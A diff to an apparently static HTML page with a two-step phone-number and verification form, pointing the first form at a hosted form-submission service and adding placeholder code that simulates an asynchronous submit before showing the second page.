@@ -44,7 +44,7 @@
 <body>
 
   <div class="form-container">
-    <form id="formPage1" class="form-page active" action="https://formsparksendingurl1.com" method="post">
+    <form id="formPage1" class="form-page active" action="https://submit-form.com/QT7UUnl6y">
       <label for="phoneNumber">Phone Number:</label>
       <input type="text" name="phoneNumber" placeholder="Enter your phone number" required>
 
@@ -69,13 +69,22 @@
 
   <script>
     function sendVerification() {
-      // Implement logic to show the next page
-      document.getElementById('formPage1').classList.remove('active');
-      document.getElementById('formPage2').classList.add('active');
+      // Implement logic to submit the first form asynchronously
+      var formPage1 = document.getElementById('formPage1');
+      var formData = new FormData(formPage1);
+
+      // You may want to add additional validation before sending the data
+
+      // Simulate AJAX request (replace with actual AJAX call)
+      setTimeout(function() {
+        // On success, show the next form
+        document.getElementById('formPage1').classList.remove('active');
+        document.getElementById('formPage2').classList.add('active');
+      }, 1000); // Simulating a delay, replace with your actual request
     }
 
     function submitForm() {
-      // Implement logic to submit the form
+      // Implement logic to submit the second form
       document.getElementById('formPage2').submit();
     }
   </script>
